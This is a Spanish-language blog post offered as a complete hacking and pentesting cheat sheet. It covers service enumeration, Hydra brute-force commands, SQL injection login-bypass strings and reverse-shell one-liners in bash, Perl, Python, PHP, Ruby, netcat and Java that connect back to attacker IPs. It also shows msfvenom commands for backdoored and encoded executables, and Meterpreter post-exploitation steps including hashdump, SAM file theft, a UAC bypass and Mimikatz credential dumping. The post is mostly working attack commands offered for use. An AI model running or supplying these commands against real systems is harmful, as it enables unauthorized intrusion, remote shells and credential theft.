---
layout: post
title: "Guia Completa de Hacking"
excerpt: "Aprende pentesting desde 0 con esta guia completa"
image: "https://hackingprofessional.github.io/Security/images/TheBibleHacker.png"
tags: 
  - Guia
  - Pentesting
  - Hacking desde 0
---

Hello Hackers!!  
El siguiente Post es una recopilacion completa donde expongo una guia completa de como enumerar, atacar y explotar diferentes servicios.  

**Nota:**  
Debido al gran contenido que abarca la seguridad informatica, este post esta en constante actualizacion.  
*- Ultima Actualizacion: 18 De Abril del 2019*

## Tabla de contenido

**[Enumeracion Inicial](#enumeracion-inicial)**<br>
**[Enumerando el servicio FTP (Puerto 21)](#enumerando-ftp)**<br>
**[Enumerando el servicio SSH (Puerto 22)](#enumerando-ssh)**<br>
**[Enumerando el servicio SMTP (Puerto 25)](#enumerando-smtp)**<br>
**[Enumerando servicios WEB (Puerto 80/443)](#enumerando-un-sitio-web)**<br>
**[Enumerando el servicio SMB (Puerto 139/445)](#enumerando-smb)**<br>
**[Enumerando el servicio Finger (Puerto 79)](#enumerando-finger)**<br>
**[Enumerando el servicio POP3 (Puerto 110)](#enumerando-pop3)**<br>
**[Enumerando el protocolo RPCBind (Puerto 111)](#enumerando-rpcbind)**<br>
**[Enumerando el servicio SNMP (Puerto 161)](#enumerando-snmp)**<br>
**[Enumerando MySQL](#enumerando-mysql)**<br>
**[Enumerando Oracle](#enumerando-oracle)**<br>
**[SQL Injections](#sqlinjections)**<br>
**[Realizando transferencias de zonas DNS](#dns-zone-transfers)**<br>
**[Montando Sistemas de archivos compartidos](#montando-recursos-compartidos)**<br>
**[Tecnicas de Fingerprinting](#tecnicas-de-fingerprinting)**<br>
**[Realizando busqueda de Exploits](#busqueda-de-exploits)**<br>
**[Como compilar Exploits](#compilando-exploits)**<br>
**[Sniffeando Trafico](#sniffer-trafic)**<br>
**[Crackeando Contraseñas](#password-cracking)**<br>
**[Realizando Ataques de fuerza bruta](#bruteforcing)**<br>
**[Generacion de shell inversas](#shell-reverse)**<br>
**[Obteniendo Shell TTY interactiva](#obtener-shell-tty-interactiva)**<br>
**[Aprendiendo a usar Metasploit](#metasploit)**<br>


## Hacking Desde 0
## Enumeracion Inicial

```bash
# Escaneo sencillo con Nmap 
nmap -v -sV -T4 192.168.6.66
```

```bash
# Ejecucion de nmap hacia todos los puertos, sin realizar descubrimiento de ping, ejecutando scripts de la categoria vuln con la velocidad T4 
nmap -v -Pn -T4 -p- --script vuln -oN machine.nmap 192.168.6.66
```

```bash
# Escaneo de todos los puertos con Masscan
masscan 192.168.6.66 -p0-65535
```

## Enumerando FTP  

```bash
# Banner grab
nc 192.168.6.66 21
```

```bash
# Ejecucion de Scripts de Nmap sobre un servidor FTP
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.6.66
```

```bash
# Validando inicio de sesion anonimo, las credenciales para este son: anonymous:anonymous
ftp 192.168.6.66
```

```bash
# Realizando Ataque fuerza bruta con hydra hacia el servicio FTP
hydra 192.168.6.66 ftp -l username -P /usr/share/wordlists/rockyou.txt -e ns -vV
```

**Archivos de configuracion relacionados a FTP**
  - ftpusers
  - ftp.conf
  - proftpd.conf

## Enumerando SSH  

```bash
# Iniciar sesion por SSH
ssh usuario@192.168.6.66
```

```bash
# Fuerza Bruta para el servicio SSH con Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.66 -t 4 ssh
```

Programas clientes para SSH
tunnelier
winsshd
putty
winscp

**Archivos de configuracion relacionados a SSH**
  - ssh_config
  - sshd_config
  - authorized_keys
  - ssh_known_hosts
  - .shosts

## Enumerando SMTP  

```bash
# Banner grab
nc 192.168.6.66 25
```

```bash
# Banner grab
telnet 192.168.6.66 21
```

```bash
#Ejecuccion de scripts de Nmap Sobre un servidor SMTP
nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.6.66
```

**Mail Spoof Test**  
```
HELO anything  
MAIL FROM: spoofed_address  
RCPT TO:valid_mail_account  
DATA   
.   
QUIT  
```  

**Archivos de configuracion relacionados a SMTP**  
sendmail.cf  
submit.cf  

## Enumerando un sitio WEB

Como realizar un descubrimiento de directorios:  

```  
dirb http://10.0.0.1/
gobuster -w diccionario.txt -u http://10.10.10.59/
```  

Realizando un analisis de vulnerabilidades con Nikto

```  
nikto -h 10.0.0.1
```  

**Crackear peticiones GET**  

```  
hydra -l username -p wordlist -t thread -vV -e ns IP http-get /admin/
hydra -l username -p wordlist -t thread -vV -e ns -f IP http-get /admin/index.php  
```  

**Crackear peticiones POST**  
*Ejemplo de formulario WEB a crackear*  

```html
<form action=”index.php” method=”POST”>
<input type=”text” name=”name” /><br><br>
<input type=”password” name=”pwd” /><br><br>
<input type=”submit” name=”sub” value=”submit”>
</form>
```  

Commando para Cracking de formularios POST：  
hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^ <title>invalido</title>”

**Herramientas Utiles**  
Burpsuite

**Archivos de configuracion relacionados a sitios web**  
Archivos Genericos
  - Examinar httpd.conf/
JBoss
  - JMX Console http://<IP>:8080/jmxconcole/
    - War File
Joomla
  - configuration.php
  - diagnostics.php
  - joomla.inc.php
  - config.inc.php
Mambo
  - configuration.php
  - config.inc.php
Wordpress
  - setup-config.php
  - wp-config.php

## Enumerando SMB

```  
enum4linux –a 10.0.0.1
```  

Para Descubrir servidores SAMBA de Windows en la subred, encuentrar las direcciones MAC de Windows, el nombre de netbios y descubrimiento del grupo de trabajo y dominio del cliente  

```  
nbtscan x.x.x.x
```  

**Escaneo con Nmap y ejecucion de Scripts relacionados.**  

```  
nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
```  

Listado de archivos de un servidor SMB.  

```  
smbclient -L //INSERTIPADDRESS/
```  

```  
smbclient \\\\10.10.10.59\\ACCT
```  

**Ataque de diccionario hacia el servicio de SMB**  

```  
hydra -l administrator -P pass.txt IP smb
```  

**Archivos de configuracion relacionados a SMB**  
Smb.conf
lmhosts

## Enumerando Finger

Descargar el siguiente script para enumerar este servicio:  
http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

```  
finger 'a b c d e f g h' @example.com
finger admin@example.com
finger user@example.com
finger 0@example.com
finger .@example.com
finger **@example.com
finger test@example.com
finger @example.com
```  

**Probando Ejecucion de comandos**  

```  
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```  

## Enumerando POP3

```  
telnet INSERTIPADDRESS 110
USER [username]
PASS [password]
Despues de iniciar sesion.  
list
El comando anterior lista los mensajes.
```  

**Escaneo con Nmap y ejecucion de Scripts relacionados.**  
```  
nmap -p110 –script pop3-brute google.com
nmap -p110 –script pop3-capabilities target
```  

**Usando Hydra sobre POP3**  
```  
hydra -l muts -P pass.txt my.pop3.mail pop3
```  

## Enumerando SNMP

```  
snmpwalk -c public -v1 10.0.0.0
```  

```  
snmpcheck -t 192.168.1.X -c public
```  

```  
onesixtyone -c names -i hosts
```  

```  
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
```  

```  
snmpenum -t 192.168.1.X
```  

**Archivos de configuracion relacionados a SNMP**  
snmp.conf
snmpd.conf
snmp-config.xml  

## Enumerando MySQL

```  
mysql -h <Hostname> -u root@localhost
```  

**Escaneo con Nmap y ejecucion de Scripts relacionados.**  
```  
nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```  

```sql
-- Ver base de datos disponibles.
SHOW DATABASES;
-- Crear una base de datos
CREATE DATABASE mydb;
-- Seleccionar una base de datos para proximas consultas.
USE mydb;
-- Eliminar una base de datos
DROP DATABASE mydb;
-- Obtener tablas de una base de datos
SHOW TABLES;
-- Crear una tabla
CREATE TABLE table1;
-- MOSTRAR DATOS
SELECT * FROM table1;
```


**Archivos relacionados a MYSQL**  
WINDOWS  
  - config.ini
  - my.ini
  - windows\my.ini
  - winnt\my.ini
  - <InstDir>/mysql/data/

UNIX  
  - my.cnf
  - /etc/my.cnf
  - /etc/mysql/my.cnf
  - /var/lib/mysql/my.cnf
  - ~/.my.cnf
  - /etc/my.cnf

Otros Archivos.  
connections.log
update.log
common.log

**Creaccion de usuarios**  
Crear usuario y otorgarle privilegios:  

```sql
mysql>create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```  

**Escalando privilegios**  

```sql  
mysql> \! cat /etc/passwd
mysql> \! bash
```  

## Enumerando Oracle

```  
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```  

**Contraseñas por defecto:**  

```  
http://www.vulnerabilityassessment.co.uk/default_oracle_passwords.htm
```  

## SQLInjections

**Inyeccion en formularios de inicio de sesion** 

```sql  
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
') or '1'='1--
') or ('1'='1—
' or 1=1/*
```  

*Uso de SQLMAP*

```  
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
```  

## DNS Zone Transfers

```  
nslookup -> set type=any -> ls -d blah.com
```  

```  
dig axfr blah.com @ns1.blah.com
```  

*Enumerando*

```  
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```  

```  
dnsenum --noreverse -o mydomain.xml example.com
```  

## Montando recursos compartidos

```  
showmount -e IPADDR
```  

montando el recurso compartido en /mnt/nfs sin bloquearlo  

```  
mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
```  

Montando recurso compartido de Windows CIFS/SMB, en Linux en la ruta /mnt/cifs.   

```  
mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
```  

Montando recursos compartidos en Windows.  
```  
net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
```  

## Tecnicas de Fingerprinting

```  
nc -v 192.168.1.1 25
```  

```  
telnet 192.168.1.1 25
```  

```  
nmap -o -v binarychaos.com
```  

## Busqueda de Exploits

En el siguiente ejemplo realizo una busqueda de exploits relacionados a windows 2003  

```  
searchsploit windows 2003 | grep -i local
```  


## Compilando Exploits

```  
gcc -o exploit exploit.c
```  

```  
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```  


## Sniffer Trafic

En el siguiente comando, realizo un capturo los paquetes del puerto 80 por el protocolo TCP por medio de la interfaz eth0 y exporto el resultado en un archivo con nombre *output.pcap*.  

```  
tcpdump tcp port 80 -w output.pcap -i eth0
```  

## Password Cracking

Para la identificacion del tipo de hash utilizar:  

```  
hash-identifier [hash]
john hashes.txt
```  

Ejemplos de uso de Hashcat:  

```  
hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt
```  

Lista de tipos de hash soportados por Hashcat:  

```  
https://hashcat.net/wiki/doku.php?id=example_hashes 
```  

## Bruteforcing

**Ejemplos del uso de Hydra**  
*Fuerza bruta a formulario enviado por Peticion POST*    
```  
hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin
```  

```  
hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt IPADDR PROTOCOL
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de SSH**  
```  
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia HTTPS**  
```  
hydra -m /index.php -l username -P pass.txt IP https
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia teamspeak**  
```  
hydra -l username -P wordlist -s portnumber -vV ip teamspeak
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia CISCO**  
```  
hydra -P pass.txt IP cisco
hydra -m cloud -P pass.txt 192.168.1.11 cisco-enable
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de SMB**  
```  
hydra -l administrator -P pass.txt IP smb
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de POP3**  
```  
hydra -l muts -P pass.txt my.pop3.mail pop3
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de RDP**  
```  
hydra IP rdp -l administrator -P pass.txt -V
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de http-proxy**  
```  
hydra -l admin -P pass.txt http-proxy://192.168.1.111
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de TELNET**  
```  
hydra IP telnet -l username -P wordlist -t 32 -s 23 -e ns -f -V
```  

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de FTP**  
```  
hydra IP ftp -l username -P wordlist -t thread(default 16) -vV
hydra IP ftp -l username -P wordlist -e ns -vV
```  

**Generacion de diccionarios**  

```bash  
crunch 15 15 -f /usr/share/crunch/charset.lst symbols14 -t Th4C00lTheacha@ -o bruteforce.dic
```  

```bash
for i in {0..9}; do echo Th4C00lTheacha$i; done >> hoola.txt
```  


## Shell-Reverse

**BASH**
```bash  
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```  

**PERL**
```perl  
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```  

**Python**
```python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```  

**PHP**
```php  
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```  

**RUBY**
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```  

**Netcat**
```bash
//Ejecutar lo siguiente en la victima:  
// IP VICTIMA = 10.10.10.69

nc -e /bin/sh 10.10.14.10 1234

//Luego de ejecutar lo anterior en el equipo victima, ejecutar lo siguiente en la maquina atacante:  
// IP ATACANTE = 10.10.14.10

nc -nvlp 10.10.10.69

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```  

**JAVA**
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```  

## Obtener Shell TTY interactiva

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

```bash
echo os.system('/bin/bash')
```

```bash
/bin/sh -i
```

```bash
execute('/bin/sh')
```

```perl
perl -e 'exec "/bin/sh";'
```

```ruby
ruby: exec "/bin/sh"
```

Usando vi / vim 
```bash
:!bash
```

Usando man, more, less
```bash
!bash
```

## Metasploit

**Generacion de payloads con msfvenom**  

### Web Payloads

| Comandos         | Explicacion                                                                 |
| --------         | ------------------------------------------------------------------          |
| msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.php | Creacion del Shell Inversa para PHP por el protocolo TCP
| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp > example.asp | Creacion del Shell Inversa para ASP por el protocolo TCP
| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp | Creats a Creacion del Shell Inversa para JSP por el protocolo TCP
| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war | Creacion del Shell Inversa para WAR por el protocolo TCP |

### Windows Payloads

| Comandos         | Explicacion                                                                 |
| --------         | ------------------------------------------------------------------          |
| msfvenom -l encoders | Lists all avalaible encoders
| msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe |	Enlazar un ejecutable con un backdoor ejecutable EXE
| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe | Crea una carga útil simple para el protocolo TCP con el codificador shikata_ga_nai
| msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe | Enlazar un ejecutable con un backdoor y lo codifica con shikata_ga_nai |

### Binaries

| Comandos         | Explicacion                                                                 |
| --------         | ------------------------------------------------------------------          |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe |	Creacion de una carga útil simple para Windows usando el protocolo TCP
| msfvenom -p windows/meterpreter/reverse_http LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe	|Creacion de una carga útil simple para Windows usando el protocolo HTTP
| msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f elf > example.elf |	Creacion de una carga útil simple para Linux usando el protocolo TCP
| msfvenom -p osx/x86/shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f macho > example.macho |	Creacion de una shell simple para MAC usando el protocolo TCP
| msfvenom -p android/meterpreter/reverse/tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} R > example.apk |	Creacion de una carga útil simple para Android usando el protocolo TCP |

**Como conseguir una shell con meterpreter!**

```zsh  
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4186]
╰─[:)] # msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run
```  

**Como usar Meterpreter**  

Luego de comprometer una maquina y tener una shell de meterpreter, hay multiples comandos que nos facilitaran la vida en la hora de interactuar con nuestra maquina victima.  

```  
upload file c:\\windows
```  
Como subir un archivo a una maquina comprometida con windows

```  
download c:\\windows\\repair\\sam /tmp
```  
Como descargar un archivo que este alojado en el equipo victima y guardarlo en nuestro equipo.

```  
execute -f c:\\windows\temp\exploit.exe
```  
Como ejecutar archivos (EXE) alojados en la maquina comprometida.  
*Esto es util para la ejecucion de exploits.*

```  
execute -f cmd -c
```  
Crea un nuevo canal con una Shell de CMD

```  
ps
```  
Como ver los procesos que corre nuestra maquina comprometida.  

```  
shell
```  
Como obtener una shell en la maquina comprometida.  

```  
getsystem
```  
Realizar un intento para escalar privilegios sobre el sistema.  

```  
hashdump
```  
El comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack

```  
portfwd add -l 3389 -p 3389 -r target
```  
Como redirigir puertos a través de la máquina comprometida hacia nosotros los atacantes.

```  
portfwd delete -l 3389 -p 3389 -r target
```  
Eliminar la redireccion de puertos.

```  
use exploit/windows/local/bypassuac
```  
Burlar el Control de Cuentas de Usuario (UAC) en Windows 7 // Indicar la IP de la victima como target + arch, x86/64

```  
use auxiliary/scanner/http/dir_scanner
```  
Analizador de directorios HTTP

```  
use auxiliary/scanner/http/jboss_vulnscan
```  
Escaner de vulnerabilidades para JBOSS

```  
use auxiliary/scanner/mssql/mssql_login
```  
Modulo para autenticarse en el servicio MSSQL.

```  
use auxiliary/scanner/mysql/mysql_version
```  
Identificar la version de MySQL.

```  
use auxiliary/scanner/oracle/oracle_login
```  
Modulo para autenticarse en el servicio de Oracle

```  
post/windows/manage/powershell/exec_powershell
```  
Ejecucion de script en powershell para una sesion de meterpreter

```  
run post/windows/gather/win_privs
```  
Ver privilegios del usuario actual.

```  
use post/windows/gather/credentials/gpp
```  
Obtener contraseñas guardadas GPP

```  
load kiwi
creds_all
```  
Cargar Mimikatz/kiwi para conseguir credenciales de usuarios autenticados.

